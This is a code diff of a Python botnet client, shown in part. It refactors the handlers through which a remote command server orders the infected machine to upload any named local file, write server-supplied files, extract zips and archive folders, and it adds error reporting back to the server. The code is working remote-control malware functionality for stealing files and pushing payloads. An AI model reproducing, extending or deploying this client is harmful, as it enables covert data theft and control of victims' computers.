@@ -90,7 +90,10 @@ def reconnect():
 
 
 
-def recv_b_file(name,size=1024):
+def recv_b_file(size=1024):
+	client.send('ready'.encode('utf-8'))
+	name = client.recv(1024).decode('utf-8')
+	client.send('ready'.encode('utf-8'))
 	with open(name,'wb') as f:
 		file_contents = client.recv(size)
 		while file_contents:
@@ -100,18 +103,25 @@ def recv_b_file(name,size=1024):
 	reconnect()
 
 
-def send_b_file(path,size=1024):
-	with open(path,'rb') as f:
-		file_contents=f.read(size)
-		while file_contents:
-			client.send(file_contents)
+def send_b_file(size=1024):
+	try:
+		path = client.recv(1024).decode('utf-8')
+		with open(path,'rb') as f:
+			client.send('ready'.encode('utf-8'))
 			file_contents=f.read(size)
+			while file_contents:
+				client.send(file_contents)
+				file_contents=f.read(size)
 
-	print('done')
-	reconnect()
+		reconnect()
+	except Exception as err:
+		client.send(str(err).encode('utf-8'))
 
 
-def recv_t_file(name,size=1024):
+def recv_t_file(size=1024):
+	client.send('ready'.encode('utf-8'))
+	name = client.recv(1024).decode('utf-8')
+	client.send('ready'.encode('utf-8'))
 	with open(name,'w') as f:
 		file_contents = client.recv(size).decode('utf-8')
 		while file_contents:
@@ -122,13 +132,18 @@ def recv_t_file(name,size=1024):
 			file_contents = client.recv(size).decode('utf-8')
 
 
-def send_t_file(path,size=1024):
-	with open(path,'r') as f:
-		file_contents = f.read(size)
-		while file_contents:
-			client.send(file_contents.encode('utf-8'))
+def send_t_file(size=1024):
+	try:
+		path = client.recv(1024).decode('utf-8')
+		with open(path,'r') as f:
+			client.send('ready'.encode('utf-8'))
 			file_contents = f.read(size)
-	client.send('~~exit~~'.encode('utf-8'))
+			while file_contents:
+				client.send(file_contents.encode('utf-8'))
+				file_contents = f.read(size)
+		client.send('~~exit~~'.encode('utf-8'))
+	except Exception as err:
+		client.send(str(err).encode('utf-8'))
 
 
 def extract_zip(zip_path,extract_path):
@@ -358,24 +373,16 @@ def botnet():
 			break
 
 		if server_command=='send binary file':
-			name = client.recv(1024).decode('utf-8')
-			client.send('ready'.encode('utf-8'))
-			recv_b_file(name,1024)
+			recv_b_file()
 
 		elif server_command=='send text file':
-			name = client.recv(1024).decode('utf-8')
-			client.send('ready'.encode('utf-8'))
-			recv_t_file(name,1024)
+			recv_t_file()
 
 		elif server_command=='recieve binary file':
-			path = client.recv(1024).decode('utf-8')
-			client.send('ready'.encode('utf-8'))
-			send_b_file(path,1024)
+			send_b_file()
 
 		elif server_command=='recieve text file':
-			path = client.recv(1024).decode('utf-8')
-			client.send('ready'.encode('utf-8'))
-			send_t_file(path,1024)
+			send_t_file()
 
 		elif server_command=='extract zip':
 			client.send('ready'.encode('utf-8'))
@@ -388,7 +395,7 @@ def botnet():
 			client.send('ready'.encode('utf-8'))
 			folder = client.recv(1024).decode('utf-8')
 			client.send('ready'.encode('utf-8'))
-			zip_name     = client.recv(1024).decode('utf-8')
+			zip_name = client.recv(1024).decode('utf-8')
 			
 			ta = Thread(target=archive,args=(folder,zip_name))
 			ta.start()
